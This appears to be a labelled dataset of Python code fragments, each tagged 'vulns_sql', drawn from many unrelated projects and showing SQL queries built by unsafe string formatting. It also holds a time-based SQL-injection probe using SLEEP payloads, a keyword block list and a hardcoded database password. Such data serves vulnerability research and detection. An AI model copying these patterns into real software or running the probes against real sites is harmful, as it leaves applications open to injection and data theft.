"  userCheckQuery = ""SELECT userId FROM Users WHERE userEmail = '{0}'"".format(username)",vulns_sql
"    queryString = ""INSERT INTO Calendars (calendarId, name, day, userId) VALUES('{0}','{1}', '{2}', {3})"".format(calendarId, calendarName, day, userResult[0])                  twentytwo, twentythree) VALUES({0},'{1}','','','','','','','','','','','','','','','','','','','','','','',                  '','')"""""".format(userResult[0], calendarId)",vulns_sql
"  getCalendarDetails = ""SELECT DISTINCT Calendars.calendarId, Calendars.name, Calendars.day FROM Users, Calendars, TimeSlots WHERE Calendars.calendarId = TimeSlots.calendarId AND (Calendars.userId = Users.userId OR TimeSlots.userId = Users.userId) AND Users.userEmail = '{0}'"".format(username)",vulns_sql
"  userCheckQuery = ""SELECT userId FROM Users WHERE userEmail = '{0}'"".format(username)",vulns_sql
"    removeCalendar = ""DELETE FROM Calendars WHERE calendarId = '{0}' AND userId = '{1}'"".format(calendarId, userResult[0])",vulns_sql
"  getCalendarDetails = ""SELECT Calendars.calendarId, Calendars.name, Calendars.day, Users.userEmail  FROM Calendars, Users WHERE Calendars.userId = Users.userId AND Calendars.calendarId = '{0}'"".format(id)",vulns_sql
"  getCalendarDetails = ""SELECT Calendars.calendarId, Calendars.name, Calendars.day, Users.userEmail  FROM Calendars, Users WHERE Calendars.userId = Users.userId AND Calendars.calendarId = '{0}'"".format(id)",vulns_sql
"  queryString = ""SELECT Users.userEmail,  TimeSlots.one, TimeSlots.two, TimeSlots.three, TimeSlots.four, TimeSlots.five, TimeSlots.six, TimeSlots.seven, TimeSlots.eight, TimeSlots.nine, TimeSlots.ten, TimeSlots.eleven, TimeSlots.twelve, TimeSlots.thirteen, TimeSlots.fourteen, TimeSlots.fifteen, TimeSlots.sixteen, TimeSlots.seventeen, TimeSlots.eighteen, TimeSlots.nineteen, TimeSlots.twenty, TimeSlots.twentyone, TimeSlots.twentytwo, TimeSlots.twentythree, TimeSlots.zero FROM TimeSlots, Users WHERE Users.userId = TimeSlots.userId AND TimeSlots.calendarId='{0}'"".format(calendarId)",vulns_sql
"  userCheckQuery = ""SELECT userId FROM Users WHERE userEmail = '{0}'"".format(username)",vulns_sql
"                  twentytwo, twentythree FROM TimeSlots WHERE userID = {0} AND calendarId='{1}'"""""".format(result[0], calendarId)",vulns_sql
"  userCheckQuery = ""SELECT userId FROM Users WHERE userEmail = '{0}'"".format(username)    timeslotQuery = ""SELECT timeSlotId FROM TimeSlots WHERE calendarId = '{0}' AND userId = {1}"".format(calendarId, userResult[0])      queryString = """"""UPDATE TimeSlots SET zero='{0}', one='{1}', two='{2}', three='{3}', four='{4}', five='{5}', six='{6}',                  seven='{7}', eight='{8}', nine='{9}', ten='{10}', eleven='{11}', twelve='{12}', thirteen='{13}',                  fourteen='{14}', fifteen='{15}', sixteen='{16}', seventeen='{17}', eighteen='{18}', nineteen='{19}',                  twenty='{20}', twentyone='{21}', twentytwo='{22}', twentythree='{23}' WHERE userId = {24} AND calendarId='{25}'"""""".format(",vulns_sql
"                    fourteen, fifteen, sixteen, seventeen, eighteen, nineteen, twenty, twentyone, twentytwo, twentythree, userId, calendarId) VALUES ('{0}','{1}',                    '{2}','{3}','{4}','{5}','{6}','{7}','{8}','{9}','{10}','{11}','{12}','{13}','{14}','{15}','{16}','{17}','{18}',                    '{19}','{20}','{21}','{22}','{23}',{24},'{25}')"""""".format(",vulns_sql
"  userCheckQuery = ""SELECT * FROM Users WHERE userEmail = '{0}'"".format(username)    queryString = ""INSERT INTO Users (userEmail, password) VALUES('{0}', '{1}');"".format(username, password)",vulns_sql
"  getUsernameAndPassword = ""SELECT userEmail, password FROM Users WHERE userEmail = '{0}'"".format(username)",vulns_sql
"      cursor.execute('SELECT userId from Users WHERE userEmail=""{0}"";'.format(name))      cursor.execute('SELECT name from Calendars WHERE userId=""{0}"";'.format(idNum))",vulns_sql
            return parameter_data['value'],vulns_sql
"        dsn = _replace_dsn_database(config.dsn, database)",vulns_sql
"def _replace_dsn_database(dsn, new_database):",vulns_sql
"    with _system_engine.connect().execution_options(            isolation_level=""AUTOCOMMIT"") as conn:        conn.execute(f'DROP DATABASE IF EXISTS {test_db_name}')        conn.execute(f'CREATE DATABASE {test_db_name}')",vulns_sql
"            print ""This web server is vulnerable for boolean based attack.""",vulns_sql
"    print ""This web server is vulnerable for Stacked Queries(Piggy Backing).""",vulns_sql
"def check_time_based_attack(url):    arr = [""'%20AND%20SLEEP(15);%20--%20"", ""\""%20AND%20SLEEP(15);%20--%20"", ""%20AND%20SLEEP(15);%20--%20""]    for e in arr:        a = time.time()        opener = urllib2.build_opener()        f = opener.open(url + e)        b = time.time()        duration = b - a        if duration > 13:            print ""This web server is vulnerable for time based attack.""            print ""The response time after boolean attack SLEEP(15) is: "" + str(duration) + ""\n""            print ""This web server is potentially vulnerable for error based attack. "" \check_boolean_based_attack(local)check_stack_query(local)check__error_based_attack(local)",vulns_sql
"    sql = 'SELECT ST_TRANSFORM(ST_MakeEnvelope('+limit+', 4326),32620);'    db.cur.execute(sql)    bounding = db.cur.fetchone()",vulns_sql
"                   FROM layers.maille_1_2 AS m WHERE m.taille_maille='1' AND ST_Within(m.geom,ST_TRANSFORM(ST_MakeEnvelope(""""""+limit+"""""", 4326),32620))  ) AS f)    db.cur.execute(sql)@addObs.route('/loadProtocoles', methods=['GET', 'POST'])",vulns_sql
"    sql = ""SELECT * FROM ""+protocole    db.cur.execute(sql)    res = db.cur.fetchall()    finalDict = dict()    for r in res:        dictValues = ast.literal_eval(r[3])        finalDict[r[2]] = dictValues['values']    return Response(flask.json.dumps(finalDict), mimetype='application/json')",vulns_sql
"user_table = 'user_objects'rank_permit_table = 'rank_privileges'def fetch(query):    conn = psycopg2.connect(""dbname=fluffy_bot user=censored password=Laumau11p"")    cur.execute(query)def update(query):    conn = psycopg2.connect(""dbname=fluffy_bot user=censored password=Laumau11p"")    cur.execute(query)def check(id, attribute, clss):    try:        attribute_value = fetch(""SELECT {} FROM {} WHERE id = '{}';"".format(attribute, clss, id))    except:        return None    else:        return attribute_valuedef rank_check(id, function):    query = check(id, 'rank', user_table)    rank = query[0][0]    query2 = fetch(""SELECT {} FROM {} WHERE FUNCTION = '{}';"".format(rank, rank_permit_table, function))    if query2[0][0] == True:def isInt(ss):",vulns_sql
    if type(ss) == type('') and len(ss) >= 15 and len(ss) <= 20 and isInt(ss):,vulns_sql
"    if not db.check(message.author.id, 'id', db.user_table):        db.update(""INSERT INTO {} (id, nickname) VALUES ('{}', '{}');"".format(db.user_table, message.author.id, message.author))            db.update(""INSERT INTO {} (id, nickname, rank) VALUES ('{}', '{}', 'member');"".format(db.user_table, msg[0], msg[1]))",vulns_sql
"    city_list = []    db = MySQLdb.Connect(host=""localhost"", port=3306, user=argv[1],                         passwd=argv[2], db=argv[3])    cur = db.cursor()    cur.execute(""""""    SELECT cities.id, cities.name, states.name    FROM cities    JOIN states ON cities.state_id=states.id    ORDER BY cities.id ASC"""""")    cities = cur.fetchall()    for city in cities:        if city[2] == argv[4]:            city_list.append(city[1])    print("", "".join(city_list))    cur.close()    db.close()",vulns_sql
"            param.set_value(request.form[param.name])        getattr(stops, pr_name)(procedure)",vulns_sql
"BAD_WORDS = ['select', 'drop', 'delete', '\'', ';', '--']",vulns_sql
"        query = ""SELECT * FROM star LIMIT %s OFFSET %s""",vulns_sql
report_cooldown = 1800,vulns_sql
"                            logging.info(""handle_updates: Insert %s returns %r"", str(answers), inserted)                    logging.info(""handle_updates: %d not in blacklist"", sender)",vulns_sql
    for expired_reporter in range(least_recent_index):        reporters_dict.pop(expired_reporter),vulns_sql
"    too_long = len(ans) > max_ans_len    logging.info(""validate_answer: %s returns %r"", str(ans), not too_long)    return not too_long",vulns_sql
"        length_exceeded = [data for data in input_row if len(data) > max_data_length]        if length_exceeded:            return (False, length_exceeded)",vulns_sql
"        query = ""SELECT passhash FROM login WHERE login = '%s';"" % login",vulns_sql
"		for row in self.cursor.execute('SELECT encrypted, json_id, date_added FROM secret WHERE date_added > %s ORDER BY date_added DESC' % from_date_added):",vulns_sql
			f.write(json.dumps(data)),vulns_sql
"        sqlstr = '''UPDATE %(database)s.phrases                    SET user_freq = %(user_freq)s                    WHERE mlen = %(mlen)s                    AND clen = %(clen)s                    AND input_phrase = ""%(input_phrase)s""                    AND phrase = ""%(phrase)s"";        ''' %{'database':database,              'user_freq': user_freq,              'mlen': len(input_phrase),              'clen': len(phrase),              'input_phrase': input_phrase,              'phrase': phrase}        self.db.execute(sqlstr)",vulns_sql
"        sqlstr = '''SELECT * FROM user_db.phrases WHERE phrase LIKE ""%(input_phrase)s%%""                    UNION ALL                    SELECT  * FROM mudb.phrases WHERE phrase LIKE ""%(input_phrase)s%%""                    ORDER BY user_freq DESC, freq DESC, id ASC, mlen ASC                    limit 1000;''' %{'input_phrase': input_phrase}        result = self.db.execute(sqlstr).fetchall()",vulns_sql
"                SELECT * FROM user_db.phrases WHERE phrase = ""%(phrase)s"" and input_phrase = ""%(input_phrase)s""                UNION ALL                SELECT * FROM mudb.phrases WHERE phrase = ""%(phrase)s"" and input_phrase = ""%(input_phrase)s""                ORDER BY user_freq DESC, freq DESC, id ASC;''' %{'phrase': phrase, 'input_phrase': input_phrase}        result = self.db.execute(sqlstr).fetchall()",vulns_sql
"from sqlalchemy.sql import and_, or_, not_, textfrom sqlalchemy.sql.expression import select, outerjoin, func, labelfrom sqlalchemy.engine.url import URLfrom sqlalchemy import create_engine, MetaData, Tablefrom sqlalchemy.engine import reflection",vulns_sql
"        cstring = URL('postgresql', password=pwd, \                host=host, database=name, username=user)        self.engine = create_engine(cstring, echo=False)        self.inspector = reflection.Inspector.from_engine(self.engine)        self.__reflect_db()        self.conn = self.engine.connect()        self.conn.close()",vulns_sql
"        evtable = self.metadata.tables['event_view']        stream_str = ""(""        index = 0        for stream_id in stream_ids:            stream_str += ""%s = %s"" % (evtable.c.stream_id, stream_id)            index += 1            if index != len(stream_ids):                stream_str += "" OR ""        stream_str += "")""        wherecl = ""(%s >= %u AND %s <= %u AND %s)"" % ( \                evtable.c.timestamp, start, evtable.c.timestamp, \                end, stream_str)        query = evtable.select().where(wherecl).order_by(evtable.c.timestamp)        return self.__execute_query(query)    def __execute_query(self, query):        res = query.execute()        event_list = []        for row in res:            foo = {}            for k,v in row.items():                foo[k] = v            event_list.append(foo)        res.close()        return ampy.result.Result(event_list)        evtable = self.metadata.tables['full_event_group_view']        wherecl = ""(%s = %u)"" % (evtable.c.group_id, group_id)        query = evtable.select().where(wherecl).order_by(evtable.c.timestamp)        return self.__execute_query(query)",vulns_sql
"        grptable = self.metadata.tables['event_group']        wherecl = and_(grptable.c.group_start_time >= start_dt, \                grptable.c.group_end_time <= end_dt)        query = grptable.select().where(wherecl).order_by(grptable.c.group_start_time)        return self.__execute_query(query)",vulns_sql
    'sqlalchemy',vulns_sql
"                       WHERE tweets.text LIKE '%{}%' """""" + ""AND tweets.text LIKE '%{}%' "" * (len(keywords) - 1)    select_tweets = select_tweets.format(*keywords)    cursor.execute(select_tweets)",vulns_sql
"	email = db.Column(db.String(50))	def __init__(self, email, password):		self.email = email	return render_template('tables.html', User=User.query.all())		user = User(request.form['email'], request.form['password'])		db.session.add(user)		db.session.commit()		return redirect(url_for('tables'))",vulns_sql
"    cur.execute('SELECT * FROM users WHERE name = \'{}\' AND password = \'{}\';'.format(user, password))",vulns_sql
"            query = ""INSERT INTO crimes (description) VALUES('{}');"".format(data)                cursor.execute(query)",vulns_sql
"    city_cur.execute(""SELECT cities.name, id AS city_id, region_id, country_id FROM cities WHERE cities.name REGEXP %s LIMIT 100""                     , (request.args[""input_text""],))    region_cur.execute(""SELECT regions.name, 'null' AS city_id, id AS region_id, country_id FROM regions WHERE regions.name REGEXP %s LIMIT 100""                       , (request.args[""input_text""],))    country_cur.execute(""SELECT countries.name, 'null' AS city_id, 'null' AS region_id, id AS country_id FROM countries WHERE countries.name REGEXP %s LIMIT 100""                        , (request.args[""input_text""],))",vulns_sql
"from django.db.models import Prefetch, Q",vulns_sql
WHERE document ,vulns_sql
        return Locality.objects.raw(locality_list_search_query.format(tokens=tokens)),vulns_sql
"                        cursor.execute(""INSERT OR REPLACE INTO SeriesTracking VALUES ('"" + getTitle(submission) + ""', '"" + getDate(submission) + ""')"")",vulns_sql
"                        cursor.execute(""DELETE FROM SeriesTracking WHERE SeriesTitle = '"" + getTitle(submission) + ""'"")",vulns_sql
"        record = (str(submission.id), getTitle(submission), str(scoresInChallenge[0][1]), str(scoresInChallenge[1][1]), str(scoresInChallenge[2][1]), getDate(submission))        cursor.execute(""INSERT OR REPLACE INTO ChallengeRankings VALUES (?, ?, ?, ?, ?, ?)"", record)",vulns_sql
"        if cursor.execute(""SELECT COUNT(*) FROM SeriesTracking WHERE SeriesTitle = '"" + str(getTitle(submission)) + ""'"").fetchone()[0] != 0:",vulns_sql
"                print(""Replying to submission: "" + str(submission.id) + "" in series: "" + str(getTitle(submission)))",vulns_sql
"    return cursor.execute(""SELECT COUNT(*) FROM ChallengeRankings WHERE SeriesTitle = '"" + getTitle(submission) + ""' AND Date <= '"" + getSubmissionDateFromDatabase(submission) + ""'"").fetchone()[0]    return cursor.execute(""SELECT StartDate FROM SeriesTracking WHERE SeriesTitle = '"" + str(getTitle(submission)) + ""'"").fetchone()[0]    return cursor.execute(""SELECT Date FROM ChallengeRankings WHERE SubmissionID = '"" + str(submission.id) + ""'"").fetchone()[0]",vulns_sql
"    for row in cursor.execute(""SELECT Place1, Place2, Place3 FROM ChallengeRankings WHERE SeriesTitle = '"" + getTitle(submission) + ""' AND Date < '"" + str(getDate(submission)) + ""'""):",vulns_sql
"        for row in cursor.execute(""SELECT Place"" + str(i) + "" FROM ChallengeRankings WHERE SeriesTitle = '"" + getTitle(submission) + ""' AND Date < '"" + str(getDate(submission)) + ""'""):",vulns_sql
"        sql = """"""SELECT username, role                 FROM roles                 WHERE roles.server_id = {0};                 """""".format(server_id)        self.cur.execute(sql)        sql = []        sql.append(""""""INSERT INTO users (username)                      VALUES ('{0}')                      ON DUPLICATE KEY UPDATE username = '{0}';                      """""".format(username))        sql.append(""""""INSERT INTO roles (username, server_id, role)                      VALUES ('{0}', '{1}', '{2}')                      ON DUPLICATE KEY UPDATE role = '{2}';                      """""".format(username, server_id, role))        for query in sql:            self.cur.execute(query)        sql = """"""INSERT INTO events (title, start_time, time_zone, server_id, description)                 VALUES ('{0}', '{1}', '{2}', '{3}', '{4}')                 """""".format(title, start_time, time_zone, server_id, description)        self.cur.execute(sql)        sql = """"""SELECT events.event_id as e, title, description, start_time, time_zone, (                   SELECT GROUP_CONCAT(DISTINCT username)                   FROM user_event, events                   WHERE user_event.event_id = e                   AND events.server_id = {0}                   AND user_event.attending = 1)                   AS accepted, (                   SELECT GROUP_CONCAT(DISTINCT username)                   FROM user_event, events                   WHERE user_event.event_id = e                   AND events.server_id = {0}                   AND user_event.attending = 0)                   AS declined                 FROM events                 WHERE events.server_id = {0}                 GROUP BY event_id, title, description, start_time, time_zone;                 """""".format(server_id)        self.cur.execute(sql)        sql = []        sql.append(""""""INSERT INTO users (username)                      VALUES ('{0}')                      ON DUPLICATE KEY UPDATE username = '{0}';                      """""".format(username))        sql.append(""""""INSERT INTO user_event (username, event_id, attending)                      VALUES ('{0}', '{1}', '{2}')                      ON DUPLICATE KEY UPDATE attending = '{2}';                      """""".format(username, event_id, attending))        for query in sql:            self.cur.execute(query)        sql = """"""SELECT title, description, start_time, time_zone, (                   SELECT GROUP_CONCAT(DISTINCT username)                   FROM user_event                   WHERE event_id = {0}                   AND user_event.attending = 1)                   AS accepted, (                   SELECT GROUP_CONCAT(DISTINCT username)                   FROM user_event                   WHERE event_id = {0}                   AND user_event.attending = 0)                   AS declined                 FROM events                 WHERE event_id = {0};                 """""".format(event_id)        self.cur.execute(sql)        sql = """"""DELETE FROM events                 WHERE event_id = {0}                 """""".format(event_id)        affected_count = self.cur.execute(sql)",vulns_sql
"        sql = """"""SELECT username, role                 FROM roles                 WHERE roles.server_id = {0};                 """""".format(server_id)        self.cur.execute(sql)        sql = []        sql.append(""""""INSERT INTO users (username)                      VALUES ('{0}')                      ON DUPLICATE KEY UPDATE username = '{0}';                      """""".format(username))        sql.append(""""""INSERT INTO roles (username, server_id, role)                      VALUES ('{0}', '{1}', '{2}')                      ON DUPLICATE KEY UPDATE role = '{2}';                      """""".format(username, server_id, role))        for query in sql:            self.cur.execute(query)        sql = """"""INSERT INTO events (title, start_time, time_zone, server_id, description)                 VALUES ('{0}', '{1}', '{2}', '{3}', '{4}')                 """""".format(title, start_time, time_zone, server_id, description)        self.cur.execute(sql)        sql = """"""SELECT events.event_id as e, title, description, start_time, time_zone, (                   SELECT GROUP_CONCAT(DISTINCT username)                   FROM user_event, events                   WHERE user_event.event_id = e                   AND events.server_id = {0}                   AND user_event.attending = 1)                   AS accepted, (                   SELECT GROUP_CONCAT(DISTINCT username)                   FROM user_event, events                   WHERE user_event.event_id = e                   AND events.server_id = {0}                   AND user_event.attending = 0)                   AS declined                 FROM events                 WHERE events.server_id = {0}                 GROUP BY event_id, title, description, start_time, time_zone;                 """""".format(server_id)        self.cur.execute(sql)        sql = []        sql.append(""""""INSERT INTO users (username)                      VALUES ('{0}')                      ON DUPLICATE KEY UPDATE username = '{0}';                      """""".format(username))        sql.append(""""""INSERT INTO user_event (username, event_id, attending)                      VALUES ('{0}', '{1}', '{2}')                      ON DUPLICATE KEY UPDATE attending = '{2}';                      """""".format(username, event_id, attending))        for query in sql:            self.cur.execute(query)        sql = """"""SELECT title, description, start_time, time_zone, (                   SELECT GROUP_CONCAT(DISTINCT username)                   FROM user_event                   WHERE event_id = {0}                   AND user_event.attending = 1)                   AS accepted, (                   SELECT GROUP_CONCAT(DISTINCT username)                   FROM user_event                   WHERE event_id = {0}                   AND user_event.attending = 0)                   AS declined                 FROM events                 WHERE event_id = {0};                 """""".format(event_id)        self.cur.execute(sql)        sql = """"""DELETE FROM events                 WHERE event_id = {0}                 """""".format(event_id)        affected_count = self.cur.execute(sql)",vulns_sql
"        sql = """"""SELECT username, role                 FROM roles                 WHERE roles.server_id = {0};                 """""".format(server_id)        self.cur.execute(sql)        sql = []        sql.append(""""""INSERT INTO users (username)                      VALUES ('{0}')                      ON DUPLICATE KEY UPDATE username = '{0}';                      """""".format(username))        sql.append(""""""INSERT INTO roles (username, server_id, role)                      VALUES ('{0}', '{1}', '{2}')                      ON DUPLICATE KEY UPDATE role = '{2}';                      """""".format(username, server_id, role))        for query in sql:            self.cur.execute(query)        sql = """"""INSERT INTO events (title, start_time, time_zone, server_id, description)                 VALUES ('{0}', '{1}', '{2}', '{3}', '{4}')                 """""".format(title, start_time, time_zone, server_id, description)        self.cur.execute(sql)        sql = """"""SELECT events.event_id as e, title, description, start_time, time_zone, (                   SELECT GROUP_CONCAT(DISTINCT username)                   FROM user_event, events                   WHERE user_event.event_id = e                   AND events.server_id = {0}                   AND user_event.attending = 1)                   AS accepted, (                   SELECT GROUP_CONCAT(DISTINCT username)                   FROM user_event, events                   WHERE user_event.event_id = e                   AND events.server_id = {0}                   AND user_event.attending = 0)                   AS declined                 FROM events                 WHERE events.server_id = {0}                 GROUP BY event_id, title, description, start_time, time_zone;                 """""".format(server_id)        self.cur.execute(sql)        sql = []        sql.append(""""""INSERT INTO users (username)                      VALUES ('{0}')                      ON DUPLICATE KEY UPDATE username = '{0}';                      """""".format(username))        sql.append(""""""INSERT INTO user_event (username, event_id, attending)                      VALUES ('{0}', '{1}', '{2}')                      ON DUPLICATE KEY UPDATE attending = '{2}';                      """""".format(username, event_id, attending))        for query in sql:            self.cur.execute(query)        sql = """"""SELECT title, description, start_time, time_zone, (                   SELECT GROUP_CONCAT(DISTINCT username)                   FROM user_event                   WHERE event_id = {0}                   AND user_event.attending = 1)                   AS accepted, (                   SELECT GROUP_CONCAT(DISTINCT username)                   FROM user_event                   WHERE event_id = {0}                   AND user_event.attending = 0)                   AS declined                 FROM events                 WHERE event_id = {0};                 """""".format(event_id)        self.cur.execute(sql)        sql = """"""DELETE FROM events                 WHERE event_id = {0}                 """""".format(event_id)        affected_count = self.cur.execute(sql)",vulns_sql
"    c.execute(""SELECT * FROM users WHERE email='""+email+""'"")",vulns_sql
"    c.execute(""SELECT * FROM users WHERE email='""+email+""'"")        c.execute(""INSERT INTO users VALUES(""+str(count)+"", '""+name+""', '""+email+""', '""+hashed+""')"")",vulns_sql
"		query = (""SELECT name,email,record_time FROM users WHERE users.name = '{}' AND users.pattern = '{}';"".format(username,pattern))",vulns_sql
        linesplit = line.split(),vulns_sql
"			query=""INSERT INTO crimes (description) VALUES('{}');"".format(data)				cursor.execute(query)",vulns_sql
"def get_full_by_id(db, id):    return get_full_sql(db, ""submission.id = %s"" % id)[0]def get_full_sql(db, filter):",vulns_sql
"                      ("" AND %s"" % filter if filter else """"))",vulns_sql
"    status = {'id': 0,              'name': 0,              'size': 0,              'age': 0,              'passes': 0,              'verified': 0}                'WHERE name=""' + path + '"";')",vulns_sql
            if db_get_file_details(file)['id'] > 0:                        db_get_file_details(file)['size']):                            db_get_file_details(file)['age']) > 60:                                    get_md5_from_file(file)):,vulns_sql
from dbhelper import BDHelper,vulns_sql
"            query = ""INSERT INTO crimes (description) VALUES ('{}');"" \                    .format(data)                cursor.execute(query)",vulns_sql
"			stmt = ""select count(*) from player where playername like '%{}%'"".format(name_filter)",vulns_sql
    if (bot.db.get_nick_id(Identifier(trigger.group(1))) == bot.db.get_nick_id(Identifier(trigger.nick))):,vulns_sql
    if (bot.db.get_nick_id(Identifier(trigger.group(1))) == bot.db.get_nick_id(Identifier(trigger.nick))):,vulns_sql
"    if trigger.group(2):    else:    karmalist = bot.db.execute(""SELECT slug, value FROM nick_values NATURAL JOIN nicknames WHERE key = 'karma' ORDER BY value DESC LIMIT "" + str(top_limit)).fetchall()",vulns_sql
"        WHERE key = 'karma' ORDER BY value DESC LIMIT %d""    karmalist = bot.db.execute(query % top_limit).fetchall()",vulns_sql
    top = request.args.get('top'),vulns_sql
"                if t is str:                    where_clause += "" %s %s='%s'"" % (where_or_and(where_clause),                                                     f.upper(),                                                     request.GET.get(f))                elif t is int:                    where_clause += "" %s %s=%s"" % (where_or_and(where_clause),                                                   f.upper(),                                                   request.GET.get(f))        cursor.execute(sql_request)",vulns_sql
"                        WHERE player_id = '%s'"""""" % player_id)",vulns_sql
"    SQL_TABLE_EXISTS = ""SELECT EXISTS(SELECT relname FROM pg_class WHERE relname='%s')""",vulns_sql
        self.cursor.execute(self.SQL_CREATE_JSON_TABLE % table_name)        self.cursor.execute(self.SQL_DROP_JSON_TABLE % table_name),vulns_sql
            self.cursor.execute(self.SQL_TABLE_EXISTS % table_name),vulns_sql
"    SQL_INSERT_JSON = ""INSERT INTO %s(data) VALUES('%s') RETURNING id""",vulns_sql
"        self.cursor.execute(self.SQL_INSERT_JSON % (self.name, json.dumps(data)))        self.cursor.execute(self.SQL_GET_JSON % (self.name, id))        self.cursor.execute(self.SQL_QUERY_JSON % (columns, self.name, query))",vulns_sql
"    def execute(self, query):            self.cursor.execute(query)",vulns_sql
"            print ""credentials file not found""",vulns_sql
"                print response.status, response.reason, response_data                print ""Unexpected error"", e",vulns_sql
"        self.insert_template = ""INSERT INTO WEATHER_MEASUREMENT (AMBIENT_TEMPERATURE, GROUND_TEMPERATURE, AIR_QUALITY, AIR_PRESSURE, HUMIDITY, WIND_DIRECTION, WIND_SPEED, WIND_GUST_SPEED, RAINFALL, CREATED) VALUES({0}, {1}, {2}, {3}, {4}, {5}, {6}, {7}, {8}, '{9}');""        self.update_template =  ""UPDATE WEATHER_MEASUREMENT SET REMOTE_ID={0} WHERE ID={1};""",vulns_sql
"        insert_query = self.insert_template.format(            self.is_none(ambient_temperature),             self.is_none(ground_temperature),             self.is_none(air_quality),             self.is_none(air_pressure),             self.is_none(humidity),             self.is_none(wind_direction),             self.is_none(wind_speed),             self.is_none(wind_gust_speed),             self.is_none(rainfall),             created)        print insert_query        self.db.execute(insert_query)            print rows_count, ""rows to send...""",vulns_sql
"                        update_query = self.update_template.format(oracle_id, local_id)                        self.db.execute(update_query)                        print ""ID:"", local_id, ""updated with REMOTE_ID ="", oracle_id                    print ""Bad response from Oracle""            print ""Nothing to upload""",vulns_sql
"    def execute(self, query):            self.cursor.execute(query)",vulns_sql
"            print ""credentials file not found""",vulns_sql
"                print response.status, response.reason, response_data                print ""Unexpected error"", e",vulns_sql
"        self.insert_template = ""INSERT INTO WEATHER_MEASUREMENT (AMBIENT_TEMPERATURE, GROUND_TEMPERATURE, AIR_QUALITY, AIR_PRESSURE, HUMIDITY, WIND_DIRECTION, WIND_SPEED, WIND_GUST_SPEED, RAINFALL, CREATED) VALUES({0}, {1}, {2}, {3}, {4}, {5}, {6}, {7}, {8}, '{9}');""        self.update_template =  ""UPDATE WEATHER_MEASUREMENT SET REMOTE_ID={0} WHERE ID={1};""",vulns_sql
"        insert_query = self.insert_template.format(            self.is_none(ambient_temperature),             self.is_none(ground_temperature),             self.is_none(air_quality),             self.is_none(air_pressure),             self.is_none(humidity),             self.is_none(wind_direction),             self.is_none(wind_speed),             self.is_none(wind_gust_speed),             self.is_none(rainfall),             created)        print insert_query        self.db.execute(insert_query)            print rows_count, ""rows to send...""",vulns_sql
"                        update_query = self.update_template.format(oracle_id, local_id)                        self.db.execute(update_query)                        print ""ID:"", local_id, ""updated with REMOTE_ID ="", oracle_id                    print ""Bad response from Oracle""            print ""Nothing to upload""",vulns_sql
"    def execute(self, query):            self.cursor.execute(query)",vulns_sql
"            print ""credentials file not found""",vulns_sql
"                print response.status, response.reason, response_data                print ""Unexpected error"", e",vulns_sql
"        self.insert_template = ""INSERT INTO WEATHER_MEASUREMENT (AMBIENT_TEMPERATURE, GROUND_TEMPERATURE, AIR_QUALITY, AIR_PRESSURE, HUMIDITY, WIND_DIRECTION, WIND_SPEED, WIND_GUST_SPEED, RAINFALL, CREATED) VALUES({0}, {1}, {2}, {3}, {4}, {5}, {6}, {7}, {8}, '{9}');""        self.update_template =  ""UPDATE WEATHER_MEASUREMENT SET REMOTE_ID={0} WHERE ID={1};""",vulns_sql
"        insert_query = self.insert_template.format(            self.is_none(ambient_temperature),             self.is_none(ground_temperature),             self.is_none(air_quality),             self.is_none(air_pressure),             self.is_none(humidity),             self.is_none(wind_direction),             self.is_none(wind_speed),             self.is_none(wind_gust_speed),             self.is_none(rainfall),             created)        print insert_query        self.db.execute(insert_query)            print rows_count, ""rows to send...""",vulns_sql
"                        update_query = self.update_template.format(oracle_id, local_id)                        self.db.execute(update_query)                        print ""ID:"", local_id, ""updated with REMOTE_ID ="", oracle_id                    print ""Bad response from Oracle""            print ""Nothing to upload""",vulns_sql
"def get_subjects():    query = ""SELECT subject, count(*) FROM articles group by subject;""    cur.execute(query)",vulns_sql
"        query = ""SELECT * FROM articles WHERE subject='"" + subject + ""' ORDER BY last_submitted DESC""        cur.execute(query)        query = ""SELECT * FROM articles WHERE index=""+str(index)        cur.execute(query)",vulns_sql
"        return render_template(""browse.html"", subjects=get_subjects())",vulns_sql
"    model = Doc2Vec.load(args.model_path)        application.run(host='0.0.0.0', debug=True)",vulns_sql
"    def perform(self, query, arg_list=None):            c = conn.cursor(cursor_factory = psycopg2.extras.RealDictCursor)            if arg_list:                c.execute(query, arg_list)            else:                c.execute(query)            result = c.fetchall()",vulns_sql
"    def perform(self, query, obj=None):",vulns_sql
"                if obj:                    c.execute(query, obj)                else:                    c.execute(query)",vulns_sql
from ooiservices.adaptor.postgres import PostgresAdaptor as PSQLfrom ooiservices.adaptor.sqlite import SQLiteAdaptor as SQL,vulns_sql
"        if 'id' not in obj:            obj['id'] = self._get_latest_id() + 1        empties = ', '.join([self.holder for col in obj])        query = 'INSERT INTO ' + self.table_name + ' (' + columns + ') VALUES (' + empties + ');'        feedback = self.sql.perform(query, obj.values())        return obj        query_params = query_params or {}        if query_params:            where_clause, query_items = self._build_where_clause(query_params)            query = 'SELECT * FROM ' + self.table_name + ' WHERE ' + where_clause            answer = self.sql.perform(query, query_items)            query = 'SELECT * FROM %s;' % (self.table_name)            answer = self.sql.perform(query)",vulns_sql
"        update_clause, query_params = self._build_update_clause(obj)        query = 'UPDATE ' + self.table_name + ' SET ' + update_clause + ' WHERE id=' + str(obj_id) + ';'        feedback = self.sql.perform(query, query_params)        return self.read({'id' : obj_id})[0]    def delete(self, obj_id):        '''        Deletes a single document        '''        query = 'DELETE FROM ' + self.table_name + ' WHERE id=' + self.holder        feedback = self.sql.perform(query, (obj_id,))    def _build_where_clause(self, query_params):        '''        Returns the WHERE clause and the tuple of items to pass in with the        string        '''        raw_clauses = []        query_items = []        for field, value in query_params.iteritems():            if field in self.where_params:                raw_clauses.append(field + '=' + self.holder)                query_items.append(value)            else:                raise ModelException(""%s is not a valid where parameter"" % field)        raw_clause = ' AND '.join(raw_clauses)        return raw_clause, query_items    def _build_update_clause(self, obj):        '''        Returns a tuple of the key/value part of the UPDATE clause and the        query params        '''        raw_clauses = []        for field, value in obj.iteritems():            raw_clauses.append(field + '=' + self.holder)        raw_clause = ', '.join(raw_clauses)        return raw_clause, obj.values()    def _get_latest_id(self):        query = 'SELECT id FROM ' + self.table_name + ' ORDER BY id DESC LIMIT 1'        results = self.sql.perform(query)        if not results:            return 0 # the very first        return results[0]['id']",vulns_sql
"    def perform(self, query, arg_list=None):            c = conn.cursor(cursor_factory = psycopg2.extras.RealDictCursor)            if arg_list:                c.execute(query, arg_list)            else:                c.execute(query)            result = c.fetchall()",vulns_sql
"    def perform(self, query, obj=None):",vulns_sql
"                if obj:                    c.execute(query, obj)                else:                    c.execute(query)",vulns_sql
